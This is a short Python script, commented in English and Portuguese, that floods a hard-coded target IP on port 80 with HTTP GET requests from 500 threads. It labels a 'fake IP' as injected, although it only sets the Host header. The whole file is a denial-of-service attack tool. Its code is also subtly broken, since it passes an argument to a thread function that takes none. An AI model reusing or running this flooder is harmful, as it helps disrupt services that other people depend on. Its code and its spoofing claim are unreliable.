#Import of functionallitys (Importação de funcionalidades)
import socket
import threading

#Var declaration (Declaração de variáveis)
target = '10.0.0.138'
fakeIp = '182.21.20.32'
port = 80
attackNum = 0 #Just to see the number of requests(Ver o número de requisições)

#Run the application (Rodar a aplicação)
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((target, port)) #Function will be running in each of our individual threads (Rodar função em cada thread específica)
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port)) #Start a loop: createSocket/connectTarget/sendHTTP
        s.sendto(("Host: " + fakeIp + "\r\n\r\n").encode('ascii'), (target, port)) #Injeção do ip fake

        #Rastrear nº de solicitações enviadas
        global attackNum 
        attackNum += 1
        print(attackNum)

        #Se quiser dar queda num serviço específico, é necessário saber qual porta está operando esse serviço
        s.close()

#Rodando em múltiplos threads
for i in range(500): #number of threads 
    thread = threading.Thread(target=attack, args=[i])
    thread.start()

#>:D KKKKKKKKK
